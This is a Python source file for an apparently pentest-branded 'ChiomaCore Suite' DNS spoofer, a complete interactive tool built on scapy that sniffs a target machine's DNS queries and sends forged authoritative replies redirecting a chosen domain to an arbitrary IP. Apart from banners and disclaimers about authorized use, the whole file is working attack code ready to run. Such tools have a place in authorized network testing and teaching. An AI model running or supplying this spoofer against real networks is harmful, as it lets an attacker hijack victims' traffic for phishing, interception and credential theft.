# ==========================================
# ChiomaCore Suite - DNS Spoofer Utility
# For educational and authorized use only
# ==========================================
#
# This tool is part of the ChiomaCore Suite.
# Use only on networks you own or have explicit permission to test.
# Unauthorized use is strictly prohibited.
#
# For support, visit: https://github.com/chiomacore
# ==========================================

import os
import sys
import time
import threading
from datetime import datetime
import colorama
from colorama import Fore, Style
colorama.init(autoreset=True)
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
import netifaces # type: ignore

def banner():
    print(Fore.GREEN + Style.BRIGHT + """
    ==========================================
    |      ChiomaCore Suite DNS Spoofer      |
    |         For authorized use only        |
    ==========================================
    """)

def print_status(message, color=Fore.CYAN):
    print(color + f"[ChiomaCore Suite] {message}")

def print_help():
    print(Fore.YELLOW + """
    Usage:
      - Run the script and follow prompts.
      - Select the correct network interface.
      - Enter the target IP and the spoofed domain/IP mapping.
      - Press Ctrl+C to stop.
    """)

def get_local_ip(iface):
    """Get the local IP address for the selected interface."""
    try:
        return netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    except Exception:
        return None

def dns_spoof(pkt, target_ip, spoof_domain, spoof_ip):
    """Callback for sniffed packets to spoof DNS responses."""
    if pkt.haslayer(DNSQR) and pkt[IP].src == target_ip:
        qname = pkt[DNSQR].qname.decode().rstrip('.')
        if qname == spoof_domain:
            print_status(f"Intercepted DNS request for {qname} from {target_ip}", Fore.YELLOW)
            spoofed_pkt = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                UDP(dport=pkt[UDP].sport, sport=53) /
                DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoof_ip)
                )
            )
            send(spoofed_pkt, verbose=0)
            print_status(f"Sent spoofed DNS response: {spoof_domain} -> {spoof_ip}", Fore.GREEN)

def start_dns_spoofing(iface, target_ip, spoof_domain, spoof_ip):
    """Start sniffing and spoofing DNS responses."""
    print_status(f"Sniffing DNS requests on {iface} for {target_ip}...", Fore.CYAN)
    sniff(
        iface=iface,
        filter=f"udp port 53 and ip src {target_ip}",
        prn=lambda pkt: dns_spoof(pkt, target_ip, spoof_domain, spoof_ip),
        store=0
    )

def list_interfaces():
    """List available network interfaces."""
    interfaces = netifaces.interfaces()
    print(Fore.CYAN + "[ChiomaCore Suite] Available Network Interfaces:")
    for idx, iface in enumerate(interfaces):
        print(Fore.YELLOW + f"  {idx}: {iface}")
    return interfaces

def about():
    print(Fore.CYAN + """
    ==========================================
    ChiomaCore Suite - DNS Spoofer Utility
    Version: 1.0.0
    Author: ChiomaCore Team
    License: For educational and authorized use only.
    ==========================================
    """)

def disclaimer():
    print(Fore.RED + """
    [!] WARNING: Unauthorized use of this tool is illegal.
    Use only for educational purposes and on networks you own or have permission to test.
    """)

def credits():
    print(Fore.GREEN + """
    ==========================================
    Credits:
    - ChiomaCore Team
    - scapy (packet manipulation library)
    - colorama (terminal color library)
    - netifaces (interface utility)
    ==========================================
    """)

def exit_message():
    print(Fore.CYAN + "\n[ChiomaCore Suite] Thank you for using the DNS Spoofer Utility.")
    print(Fore.CYAN + "[ChiomaCore Suite] Stay safe and use responsibly!")
    print(Fore.CYAN + "[ChiomaCore Suite] Goodbye!\n")

if __name__ == "__main__":
    banner()
    print_help()
    disclaimer()
    interfaces = list_interfaces()
    iface_idx = input(Fore.CYAN + "[ChiomaCore Suite] Select interface number: ")
    try:
        iface_idx = int(iface_idx)
        iface = interfaces[iface_idx]
    except (ValueError, IndexError):
        print_status("Invalid interface selection. Exiting.", Fore.RED)
        sys.exit(1)

    local_ip = get_local_ip(iface)
    if not local_ip:
        print_status("Could not determine local IP for selected interface.", Fore.RED)
        sys.exit(1)

    target_ip = input(Fore.YELLOW + "[ChiomaCore Suite] Enter Target IP: ").strip()
    spoof_domain = input(Fore.YELLOW + "[ChiomaCore Suite] Enter Domain to Spoof (e.g., example.com): ").strip()
    spoof_ip = input(Fore.YELLOW + "[ChiomaCore Suite] Enter IP to Redirect Domain To: ").strip()

    print_status(f"Starting DNS spoofing for {spoof_domain} -> {spoof_ip} (target: {target_ip})", Fore.CYAN)
    try:
        start_dns_spoofing(iface, target_ip, spoof_domain, spoof_ip)
    except KeyboardInterrupt:
        print_status("\nStopping DNS spoofing...", Fore.YELLOW)
    credits()
    exit_message()